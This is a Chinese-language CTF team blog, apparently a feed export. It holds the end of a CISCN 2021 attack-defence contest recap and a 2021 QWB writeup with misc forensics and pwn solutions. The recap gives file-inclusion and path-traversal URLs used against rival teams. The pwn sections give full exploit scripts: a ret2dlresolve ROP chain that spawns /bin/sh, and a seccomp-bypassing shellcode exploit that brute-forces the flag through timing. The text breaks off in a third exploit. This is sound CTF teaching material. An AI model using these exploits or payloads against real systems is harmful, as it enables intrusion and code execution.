title="14:20 - 第33轮 - pwn重放成功"></a>14:20 - 第33轮 - pwn重放成功</h4><p>pwn师傅重放14成功！</p><img src="/article/2021ciscnawd/image-20210622144406529.png" class="" title="image-20210622144406529" loading="lazy"><p>开始准备批量打，这时发现批量打脚本有问题，无法结束连接。无奈最后我们全部手交14的flag一直交到比赛结束，中间遗漏了不少</p><h4 id="15-00-第37轮-新题上场"><a href="#15-00-第37轮-新题上场" class="headerlink" title="15:00 - 第37轮 - 新题上场"></a>15:00 - 第37轮 - 新题上场</h4><img src="/article/2021ciscnawd/image-20210622145507276.png" class="" title="image-20210622145507276" loading="lazy"><p>11,12全down了，16pwn师傅还是自行宕机</p><p>此时上了新题，一道简单web，我们决定努力一下</p><p>直接发现文件包含漏洞</p><p><code>./statics/1.php?file=/flag</code></p><p>里面是个file_get_contents，直接删除，我立刻写脚本开始全场打</p><img src="/article/2021ciscnawd/image-20210622151547266.png" class="" title="image-20210622151547266" loading="lazy"><p>题目刚上来一轮就攻击成功，也有其他队发现了漏洞，和我们平分了分数</p><img src="/article/2021ciscnawd/image-20210622151717676.png" class="" title="image-20210622151717676" loading="lazy"><p>这一波的反应极其迅速，可是还是无法弥补前面的差距。但我们不想放弃。</p><p>决定一位web师傅继续审计17，另外的师傅修11/12，我继续审计流量。</p><h4 id="15-20-第39轮-再出一洞"><a href="#15-20-第39轮-再出一洞" class="headerlink" title="15:20 - 第39轮 - 再出一洞"></a>15:20 - 第39轮 - 再出一洞</h4><p>审计发现了17第二个洞如下</p><p><code>/index.php?g=Admin&amp;m=Public&amp;a=display&amp;templateFile=../../../../../../../../../../../../../../flag</code></p><p>与11模版相似，直接写脚本再打</p><img src="/article/2021ciscnawd/image-20210622152502255.png" class="" title="image-20210622152502255" loading="lazy"><p>修复方法直接注释</p><h4 id="15-50-第42轮-针对check"><a href="#15-50-第42轮-针对check" class="headerlink" title="15:50 - 第42轮 - 针对check"></a>15:50 - 第42轮 - 针对check</h4><p>12网站正常却checkdown，发现数据库给人删了，听说是sql注入手注给人删了库，我们仅剩一次重置机会，况且11现在还在宕机找不到原因。</p><p>队里师傅灵机一动开始分析，我们发现check流量是登陆随机用户，用户名密码都是错的，验证码不可能智能到分析验证码吧</p><p>来自10.10.10.10的check流量</p><img src="/article/2021ciscnawd/image-20210622153217583.png" class="" title="image-20210622153217583" loading="lazy"><p>现在登陆会显示数据库错误，那就全局搜索，把<code>数据库错误</code>改成了<code>验证码错误</code></p><img src="/article/2021ciscnawd/image-20210622154205778.png" class="" title="image-20210622154205778" loading="lazy"><h4 id="16-00-第43轮"><a href="#16-00-第43轮" class="headerlink" title="16:00 - 第43轮"></a>16:00 - 第43轮</h4><p>pwn师傅尝试修复14被checkdown并被攻击</p><p>11经确认被人写码了，占用资源疯狂写缓存</p><img src="/article/2021ciscnawd/image-20210622154547731.png" class="" title="image-20210622154547731" loading="lazy"><p>实在是不知道怎么办，如果重置的话又会被打。</p><p>pwn师傅说他累了，手 交 要洗内了</p><h4 id="16-30-第46轮-新的0day"><a href="#16-30-第46轮-新的0day" class="headerlink" title="16:30 - 第46轮 - 新的0day"></a>16:30 - 第46轮 - 新的0day</h4><p>12突然报又被打了，立刻查流量</p> <img src="/article/2021ciscnawd/image-20210622155218748.png" class="" title="image-20210622155218748" loading="lazy"><p>然后一刷新主页发现flag就在主页</p><p>咱们就也写，复现成功</p><img src="/article/2021ciscnawd/image-20210622155711588.png" class="" title="image-20210622155711588" loading="lazy"><p>最后一句话没写进去，不知道为啥</p><p>修复就再编辑下把自己的主页恢复就行。前端rce，收获0day一个</p><p>第47轮惨状留念</p><img src="/article/2021ciscnawd/image-20210622154927603.png" class="" title="image-20210622154927603" loading="lazy"><h4 id="17-00-第49轮"><a href="#17-00-第49轮" class="headerlink" title="17:00 - 第49轮"></a>17:00 - 第49轮</h4><img src="/article/2021ciscnawd/image-20210622160146600.png" class="" title="image-20210622160146600" loading="lazy"><p>pwn师傅说他真的累了，给pwn师傅写了个一键提交，让他稍微轻松一点</p><img src="/article/2021ciscnawd/image-20210622160205845.png" class="" title="image-20210622160205845" loading="lazy"><h4 id="17-30-第52轮-复原pwn题"><a href="#17-30-第52轮-复原pwn题" class="headerlink" title="17:30 - 第52轮 - 复原pwn题"></a>17:30 - 第52轮 - 复原pwn题</h4><p>比赛还剩一个小时，pwn师傅将pwn题全部复原了</p><img src="/article/2021ciscnawd/image-20210622161135972.png" class="" title="image-20210622161135972" loading="lazy"><p>11不准备修了，不准备重置了，躺平了。</p><p>咱开了31个shell帮pwn师傅一起交flag</p><img src="/article/2021ciscnawd/image-20210622162019446.png" class="" title="image-20210622162019446" loading="lazy"><h4 id="18-10-第56轮"><a href="#18-10-第56轮" class="headerlink" title="18:10 - 第56轮"></a>18:10 - 第56轮</h4><img src="/article/2021ciscnawd/image-20210622161728291.png" class="" title="image-20210622161728291" loading="lazy"><p>咱17从3:00刚上到最后没被打一次，而且刚上就一直在打别人，算是小小的欣慰吧。</p><h4 id="18-30-第57轮-比赛结束"><a href="#18-30-第57轮-比赛结束" class="headerlink" title="18:30 - 第57轮 - 比赛结束"></a>18:30 - 第57轮 - 比赛结束</h4><p>最终记录</p><img src="/article/2021ciscnawd/BDD377D32C18C9C712D72741E9A5A11A.jpg" class="" title="BDD377D32C18C9C712D72741E9A5A11A" loading="lazy"><p>饭都凉了，一天没吃东西</p><hr><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>结束后合照都没有，我们2只队直接离开了赛场。</p><p>这是5位大三师傅们最后一次比赛了可能。</p><p>大二我是web，两位是pwn，一位准备考研去不想打ctf了，另一位很自责</p><p>那位pwn师傅回校后2小时复现了全部的题，自动化提交flag脚本注释掉一行就好了</p><p>他现在非常非常自责</p><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>其实并不是pwn师傅一个人的责任，我们团队的问题还是很大。</p><p>3web1pwn的配置就把重担压在了pwn师傅身上</p><p>这次比赛说实话题目下发时间有点不合理</p><p>开赛2web2pwn，12:00竟上了2pwn，15:00上了1web</p><p>说实话就算12:00上1web1pwn，即web多3小时，pwn少3小时。咱们还是有机会的</p><p>当然咱不能怪主办方问题，咱们自身pwn薄弱是根本问题</p><hr><h2 id="对于下届的想法"><a href="#对于下届的想法" class="headerlink" title="对于下届的想法"></a>对于下届的想法</h2><p>觉得咱们对于新人的培养出现了问题，工作室的作风慵懒。</p><p>对于我们这届，进入后没有再次考核，8位师傅有的根本就不再学习技术了</p><p>排除走文艺路线，非技术路线，我们平时的技术提升全靠自己自觉</p><p>对于20届，我们应该除了注重自身的技术成长，也要关注学弟学妹们的培养</p><p>我们工作室已经有断代的迹象了，这次比赛体现了出来，明年可能会更加严重</p><p>咱希望就算从头做起，也不希望辜负前面师傅们打下的基石</p><p>就这样吧</p><p>2021年6月22日</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;第一次打正式的国赛半决赛awd，复盘总结，分析与反思&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>2021强网杯</title>
    <link href="https://err0r.top/article/2021qwb/"/>
    <id>https://err0r.top/article/2021qwb/</id>
    <published>2021-06-13T13:11:17.000Z</published>
    <updated>2021-06-21T05:32:29.291Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h1 id="一、战队信息："><a href="#一、战队信息：" class="headerlink" title="一、战队信息："></a>一、战队信息：</h1><p>战队名称：我是菜鸡QAQ</p><p>战队排名：68名</p><h1 id="二、解题情况-："><a href="#二、解题情况-：" class="headerlink" title="二、解题情况 ："></a>二、解题情况 ：</h1><img src="/article/2021qwb/image.png" class="" title="image" loading="lazy"><h1 id="三、解题过程："><a href="#三、解题过程：" class="headerlink" title="三、解题过程："></a>三、解题过程：</h1><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a><strong>Misc</strong></h1><h2 id="ISO1995-SOLVED-｜-D0gekong"><a href="#ISO1995-SOLVED-｜-D0gekong" class="headerlink" title="ISO1995 | SOLVED ｜ D0gekong"></a>ISO1995 | SOLVED ｜ D0gekong</h2><p>拿到文件放进kail用file可以看出是一个debian的磁盘文件，用binwalk可以分离出一个iso文件，用ultraiso打开iso文件，将里面的文件提取出来</p><p>提取出来可发现每个文件都是一个字节的文本</p><img src="/article/2021qwb/thumbnail.png" class="" title="thumbnail" loading="lazy"><p>用batch批处理命令拼接可得到以下文本</p><pre class="language-none"><code class="language-none">!&#x3D;gF~B.@YBO1.%DYzbA-1]&#125;jH&amp;@ ,K[7t&#x2F;LOi*5b)L &#39;&lt;pw&#39;am\W4LH@\toGKE1f &quot;oDWOaf2&#123;1&#123;w_ov-m:af8A044iCT_+ $w3cz(L0O)L_-s8&#39;_&lt;Ic &#x2F;KFP9vrr~6\ni&#123;~#g5cs#7z2S++Y1BbYQV&#39;is1&#x3D;DZ_| 3T1QxWEwX]&#125;NS@_3SdKK]91b?s-rs6g0QwBs @4#5TGxw#&amp;4ArDw~_X&quot;!._IAo&#96;&#39;xso&#39;.s5)+c9RU&#39; &#x2F;%_b[rjioPOy!&amp;&#x2F;)wjKR#工jih0&#39;\,Dr! &amp;PHNf%, YOWEJ(2wXj&#x2F;u~1@gh%&amp;_6z5U~A&#x3D;OpAV$E&#x2F; &gt;1Kg:@4tS:V4ZB&#96;1_x*.17B&amp;:&lt;XnOrw| 2TY_DSN&lt;zvbKCj7+6w&#39;r&#125;Lo8&#39;:fYC@Fv102vbo)noQ1MT3#AZ+]U3##P|w&#123;V&gt;z,G5[s r&#x2F;Ra~p&#39;&gt;o0Y]&#123;0&#123;8&quot;oh&#x3D;vG*S82KoNt17|,*r#d!&#x3D;N&#39;%0$1Tron:7&#125;6c(yVSIZmtw8xza]6D ,nn*q&amp;KHNK,PW .b&lt;h E$)&#123;Kw_)h ,&#x3D;m41LAv&#39;f61:T xN:4z0&#123;&gt;&amp;F5(cRg| :M9RVX$,8&#x2F;1vq-][?a&#x2F;H)1&quot;x; ((,NZ(&#x3D;wJ4o&lt;&#x2F;_8.D9Q8~t&quot;aA:RNTXpSC8LKW+Pfgw&lt;NTqmy_8G6Np%c-9tAG-em&amp;]1IYtz\12a1KD&amp;z&lt;k &#39;w7HFr--py2uH&#x3D;;37*iuisp39+m ;&quot;1:xPJBC*LB8;x*?G. &#39; &#96;nA[PibSKN&gt;RFG#vDrw7k@QcOebUkG,~fvtxH [w&lt;f:e]mcbx,Yi6KcZ~八VHLR,t&#123;F&#x3D;&#125;gTKX&amp;;A_Fv1b,DeZJ1N]6q)76a]Us&#x3D;\u8tY;t*#]zSGo~-h64&#x3D;u2bGZ)1(&amp;%K68a!nQke&amp;+gX&#x3D;L4TmMy$5nHC&amp;+#&lt;486HKF4f0d%1?I:1&#x3D;M[p~DXELtCKh\&gt;4&lt;Qf+cj?a3pOF~4*-9%7*&lt;~&#39; +KkQ&lt;*z9oUgrgo$:NC.Di&lt;.$&#96;s+69Pn7:TgO~A\TKn |Q&#39;G&amp;9TX-@!6w&lt;VK_5tH&#x2F;#i&gt;$7SKKH[Dki-o&#123;b&#123;?j?4.ZW+aV! |zi&#123;2oTqk*#! o0h$-6oCbPpazbPfi</code></pre><p>然后把iso放进010里，搜索FFFF,发现FFFF后面的两字节每个都不一样猜测有蹊跷，用脚本提取出来</p><p>脚本附上：</p><pre class="language-python" data-language="python"><code class="language-python">result <span class="token operator">=</span> <span class="token string">b""</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"iso1995.iso"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fp<span class="token punctuation">:</span>    data <span class="token operator">=</span> fp<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        index <span class="token operator">=</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">b"\xff\xff\xff\xff"</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> index <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>        temp <span class="token operator">=</span> data<span class="token punctuation">[</span>index<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">:</span>index<span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">]</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span>        result <span class="token operator">+=</span> temp        data <span class="token operator">=</span> data<span class="token punctuation">[</span>index<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"result"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fp<span class="token punctuation">:</span>    fp<span class="token punctuation">.</span>write<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token keyword">import</span> structbase <span class="token operator">=</span> <span class="token string">"iso1995/flag_f"</span>result <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"result"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fp<span class="token punctuation">:</span>    data <span class="token operator">=</span> fp<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        r <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">">h"</span><span class="token punctuation">,</span> data<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        name <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>r<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>base <span class="token operator">+</span> name<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fp<span class="token punctuation">:</span>            result <span class="token operator">+=</span> fp<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span></code></pre><p>可得到以下文本，在里面找到flag</p><p>FLAG{Dir3ct0ry_jYa_n41}</p><h2 id="EzTime-SOLVED-｜-D0gekong"><a href="#EzTime-SOLVED-｜-D0gekong" class="headerlink" title="EzTime | SOLVED ｜ D0gekong"></a>EzTime | SOLVED ｜ D0gekong</h2><p>解压得到文件</p><p>直接用ntfs log tracker工具一把梭</p><p>根据题目提示发现有很多跟flag相似的文本</p><p>一个一个尝试，最后发现flag是{45EF6FFC-F0B6-4000-A7C0-8D1549355A8C}.png</p><h2 id="BlueTeaming-SOLVED｜Hn13"><a href="#BlueTeaming-SOLVED｜Hn13" class="headerlink" title="BlueTeaming | SOLVED｜Hn13"></a>BlueTeaming | SOLVED｜Hn13</h2><p>解压文件可得memory.dmp,通过volatility的dump口令将注册表给提取出来放入windows registry recovery查看注册表</p><p>查阅路径翻到HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Communication里有power shell 脚本 </p><p>到后面才意识到这就是</p><p>flag:HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Communication</p><h2 id="CipherMan-SOLVED-Hn13"><a href="#CipherMan-SOLVED-Hn13" class="headerlink" title="CipherMan | SOLVED |Hn13"></a>CipherMan | SOLVED |Hn13</h2><p>解压文件，打开两个卷发现里面的secret需要先获取密码才能解开分区.</p><p>由给出的内容可知，密码应该放在memory中，结合filescan以及grep发现两个文件</p><p>导出来是这样</p><p>221628-533357-667392-449185-516428-718443-190674-375100为解密密钥</p><p>输入密钥打开后有个readme文件，打开就是flag</p><p>flag：Wow, you have a great ability. How did you solve this? Are you a hacker? Please give me a lessonlater.</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a><strong>Crypto</strong></h1><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a><strong>Pwn</strong></h1><h2 id="强网先锋-on-output-SOLVED-winter"><a href="#强网先锋-on-output-SOLVED-winter" class="headerlink" title="[强网先锋]on output| SOLVED |winter"></a>[强网先锋]on output| SOLVED |winter</h2><p>触发就能有如下的溢出</p><p>直接触发信号得到溢出进行ret2_dl_runtime_resolve就行了</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"i386"</span><span class="token comment">#p = process("./test")</span>p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'39.105.138.97'</span><span class="token punctuation">,</span><span class="token number">1234</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./test"</span><span class="token punctuation">)</span>s <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span>sa <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span> b<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span>sl <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span>sla <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span> b<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span>r <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token operator">=</span><span class="token number">4096</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>a<span class="token punctuation">)</span>rl <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>ru <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span>buf <span class="token operator">=</span> <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">0x30</span>src <span class="token operator">=</span> <span class="token string">"b"</span> <span class="token operator">*</span> <span class="token number">0x20</span>s<span class="token punctuation">(</span>buf<span class="token punctuation">)</span>s<span class="token punctuation">(</span>src<span class="token punctuation">)</span>sl<span class="token punctuation">(</span><span class="token string">"hello_boy\x00\x00\x00\x00\x00\x00\x00"</span><span class="token punctuation">)</span>sl<span class="token punctuation">(</span><span class="token string">"-2147483648"</span><span class="token punctuation">)</span>sl<span class="token punctuation">(</span><span class="token string">"-1"</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>binary <span class="token operator">=</span> elfrop <span class="token operator">=</span> ROP<span class="token punctuation">(</span>context<span class="token punctuation">.</span>binary<span class="token punctuation">)</span>dlresolve <span class="token operator">=</span> Ret2dlresolvePayload<span class="token punctuation">(</span>elf<span class="token punctuation">,</span>symbol<span class="token operator">=</span><span class="token string">"system"</span><span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"/bin/sh"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>rop<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>dlresolve<span class="token punctuation">.</span>data_addr<span class="token punctuation">)</span>rop<span class="token punctuation">.</span>ret2dlresolve<span class="token punctuation">(</span>dlresolve<span class="token punctuation">)</span>raw_rop <span class="token operator">=</span> rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token number">0x4c</span><span class="token punctuation">:</span>raw_rop<span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">:</span>dlresolve<span class="token punctuation">.</span>payload<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>flag值：</p><h2 id="Shellcode-SOLVED-H3h3QAQ"><a href="#Shellcode-SOLVED-H3h3QAQ" class="headerlink" title="Shellcode | SOLVED | H3h3QAQ"></a>Shellcode | SOLVED | H3h3QAQ</h2><p>Read和mmap没有被禁。</p><p>先mmap出一片空间，然后切换位数，再次read shellcode，再把flag读入内存，循环用cmp一位一位判断，最后拼接得到flag。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># context(log_level = 'debug')</span> <span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> index<span class="token punctuation">,</span> ch<span class="token punctuation">)</span><span class="token punctuation">:</span>    append_x86 <span class="token operator">=</span> <span class="token triple-quoted-string string">'''    push ebx    pop ebx    '''</span>    shellcode_open <span class="token operator">=</span> <span class="token triple-quoted-string string">'''    mov esp,0x40404140    push 0x67616c66    push esp    pop ebx    xor ecx,ecx    mov eax,5    int 0x80    mov ecx,eax    '''</span>    shellcode_flag <span class="token operator">=</span> <span class="token triple-quoted-string string">'''    push 0x33    push 0x40404089    retfq    mov rdi,rcx    mov rsi,rsp    mov rdx,0x70    xor rax,rax    syscall    '''</span>     <span class="token comment"># cmp</span>    <span class="token keyword">if</span> index <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        shellcode_flag <span class="token operator">+=</span> <span class="token string">"cmp byte ptr[rsi+&#123;0&#125;], &#123;1&#125;; jz $-3; ret"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> ch<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        shellcode_flag <span class="token operator">+=</span> <span class="token string">"cmp byte ptr[rsi+&#123;0&#125;], &#123;1&#125;; jz $-4; ret"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> ch<span class="token punctuation">)</span>    shellcode_open <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcode_open<span class="token punctuation">)</span>    shellcode_flag <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcode_flag<span class="token punctuation">,</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">)</span>    shellcode <span class="token operator">=</span> <span class="token string">''</span>    append <span class="token operator">=</span> <span class="token triple-quoted-string string">'''    push rdx    pop rdx    '''</span>    shellcode_mmap <span class="token operator">=</span> <span class="token triple-quoted-string string">'''    push 0x40404040    pop rdi    push 0x7e    pop rsi    push 0x40    pop rax    xor al,0x47    push rax    pop rdx    push 0x40    pop rax    xor al,0x40    push rax    pop r8    push rax    pop r9    push rbx    pop rax    push 0x5d    pop rcx    xor byte ptr[rax+0x31],cl    push 0x5f    pop rcx    xor byte ptr[rax+0x32],cl    push 0x22    pop rcx    push 0x40    pop rax    xor al,0x49    '''</span>    shellcode_read <span class="token operator">=</span> <span class="token triple-quoted-string string">'''    push 0x40404040    pop rsi    push 0x40    pop rax    xor al,0x40    push rax    pop rdi    xor al,0x40    push 0x70    pop rdx    push rbx    pop rax    push 0x5d    pop rcx    xor byte ptr[rax+0x57],cl    push 0x5f    pop rcx    xor byte ptr[rax+0x58],cl    push rdx    pop rax    xor al,0x70    '''</span>    shellcode_retfq <span class="token operator">=</span> <span class="token triple-quoted-string string">'''    push rbx    pop rax    xor al,0x40    push 0x72    pop rcx    xor byte ptr[rax+0x40],cl    push 0x68    pop rcx    xor byte ptr[rax+0x40],cl    push 0x47    pop rcx    sub byte ptr[rax+0x41],cl    push 0x48    pop rcx    sub byte ptr[rax+0x41],cl    push rdi    push rdi    push 0x23    push 0x40404040    pop rax    push rax    '''</span>    shellcode <span class="token operator">+=</span> shellcode_mmap    shellcode <span class="token operator">+=</span> append    shellcode <span class="token operator">+=</span> shellcode_read    shellcode <span class="token operator">+=</span> append    shellcode <span class="token operator">+=</span> shellcode_retfq    shellcode <span class="token operator">+=</span> append    shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">,</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">)</span>     p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>shellcode_open <span class="token operator">+</span> <span class="token number">0x29</span><span class="token operator">*</span><span class="token string">b'\x90'</span> <span class="token operator">+</span> shellcode_flag<span class="token punctuation">)</span>index <span class="token operator">=</span> <span class="token number">0</span>flag <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> ch <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'39.105.137.118'</span><span class="token punctuation">,</span> <span class="token number">50050</span><span class="token punctuation">)</span>        <span class="token comment">#p=process('./shellcode')</span>        pwn<span class="token punctuation">(</span>p<span class="token punctuation">,</span> index<span class="token punctuation">,</span> ch<span class="token punctuation">)</span>        start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">pass</span>        end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> end <span class="token operator">-</span> start <span class="token operator">></span> <span class="token number">1.5</span><span class="token punctuation">:</span>            flag<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ch<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">break</span>    index <span class="token operator">=</span> index <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre><p>flag值：</p><h2 id="Baby-diary-SOLVED-NN"><a href="#Baby-diary-SOLVED-NN" class="headerlink" title="Baby_diary| SOLVED | NN"></a>Baby_diary| SOLVED | NN</h2><p>输入函数存在off by one漏洞</p><p>由于要绕过检查，我们利用largebin的残留数据伪造chunk，再通过off by one改inuse位，实现unlink，这里需要改一下fd，由于输入函数会放‘\x00’，这里要爆破一下，后面就是leak和打freehook了。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#sh=process('./baby_diary')</span><span class="token comment">#sh=remote('8.140.114.72', 1399)</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token 